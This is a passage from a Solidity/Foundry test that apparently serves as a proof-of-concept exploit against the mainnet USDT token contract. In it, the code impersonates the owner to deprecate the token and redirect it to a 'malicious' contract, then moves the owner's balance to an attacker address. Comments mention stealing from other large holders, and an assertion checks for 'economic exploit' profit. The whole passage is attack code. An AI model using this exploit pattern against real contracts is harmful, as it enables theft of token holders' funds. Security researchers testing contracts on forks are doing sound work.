        // Impersonate the owner to call deprecate
        vm.startPrank(currentOwner);
        target.deprecate(address(malicious));
        vm.stopPrank();

        // Verify the contract is now deprecated
        assertEq(target.deprecated(), true, "Contract should be deprecated");
        assertEq(target.upgradedAddress(), address(malicious), "Upgraded address should be malicious contract");

        // Now we can use the malicious contract to steal funds
        // We need to find some large token holders to steal from
        // Let's check the balance of the owner first (they have initial supply)
        uint ownerBalance = target.balanceOf(currentOwner);
        if (ownerBalance > 0) {
            // Use transferByLegacy to steal from owner to attacker
            // The malicious contract will handle the transfer
            malicious.transferByLegacy(currentOwner, attacker, ownerBalance);
        }

        // We could also steal from other large holders, but for PoC, owner balance is sufficient
        // Check attacker's balance increased
        uint attackerBalance = target.balanceOf(attacker);
        assertGt(attackerBalance, 0, "Attacker should have stolen tokens");
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

